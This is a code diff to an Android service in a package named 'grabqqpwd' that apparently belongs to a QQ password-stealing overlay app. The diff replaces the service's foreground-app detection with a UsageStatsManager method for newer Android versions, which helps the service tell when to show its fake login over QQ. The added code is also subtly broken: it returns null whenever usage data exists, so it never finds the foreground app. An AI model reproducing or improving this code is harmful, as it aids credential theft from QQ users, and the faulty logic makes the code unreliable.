@@ -1,8 +1,11 @@
 package com.android.grabqqpwd;
 
 import android.Manifest;
+import android.annotation.TargetApi;
 import android.app.ActivityManager;
 import android.app.Service;
+import android.app.usage.UsageStats;
+import android.app.usage.UsageStatsManager;
 import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
@@ -19,6 +22,7 @@ import android.support.v4.content.ContextCompat;
 import android.text.TextUtils;
 import android.text.method.HideReturnsTransformationMethod;
 import android.text.method.PasswordTransformationMethod;
+import android.util.Log;
 import android.view.Gravity;
 import android.view.LayoutInflater;
 import android.view.MotionEvent;
@@ -31,8 +35,10 @@ import android.widget.EditText;
 
 import com.jaredrummler.android.processes.ProcessManager;
 
+import java.io.IOException;
 import java.lang.reflect.Field;
 import java.security.Permission;
+import java.util.Date;
 import java.util.List;
 
 /**
@@ -88,6 +94,7 @@ public class BackgroundDetectService extends Service implements View.OnClickList
         }
     }
 
+    //5.0之前可以使用getRunningAppProcesses()函数获取
     private String getTopActivityBeforeL(){
         ActivityManager activityManager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
         final List<ActivityManager.RunningAppProcessInfo> taskInfo = activityManager.getRunningAppProcesses();
@@ -125,10 +132,36 @@ public class BackgroundDetectService extends Service implements View.OnClickList
 
     //注：6.0之后此方法也不太好用了。。。求帮忙
     //http://stackoverflow.com/questions/30619349/android-5-1-1-and-above-getrunningappprocesses-returns-my-application-packag
-    private String getTopActivityAfterLM(){
-        ActivityManager.RunningAppProcessInfo topActivity =
-                ProcessManager.getRunningAppProcessInfo(this).get(0);
-        return topActivity.processName;
+//    private String getTopActivityAfterLM(){
+//        ActivityManager.RunningAppProcessInfo topActivity =
+//                ProcessManager.getRunningAppProcessInfo(this).get(0);
+//        return topActivity.processName;
+//    }
+
+    @TargetApi(Build.VERSION_CODES.LOLLIPOP_MR1)
+    private String getTopActivityAfterLM() {
+        try {
+            UsageStatsManager usageStatsManager = (UsageStatsManager) getSystemService(Context.USAGE_STATS_SERVICE);
+            long milliSecs = 60 * 1000;
+            Date date = new Date();
+            List<UsageStats> queryUsageStats = usageStatsManager.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, date.getTime() - milliSecs, date.getTime());
+            if (queryUsageStats.size() > 0) {
+                return null;
+            }
+            long recentTime = 0;
+            String recentPkg = "";
+            for (int i = 0; i < queryUsageStats.size(); i++) {
+                UsageStats stats = queryUsageStats.get(i);
+                if (stats.getLastTimeStamp() > recentTime) {
+                    recentTime = stats.getLastTimeStamp();
+                    recentPkg = stats.getPackageName();
+                }
+            }
+            return recentPkg;
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+        return "";
     }
 
     private class MyHandler extends Handler{
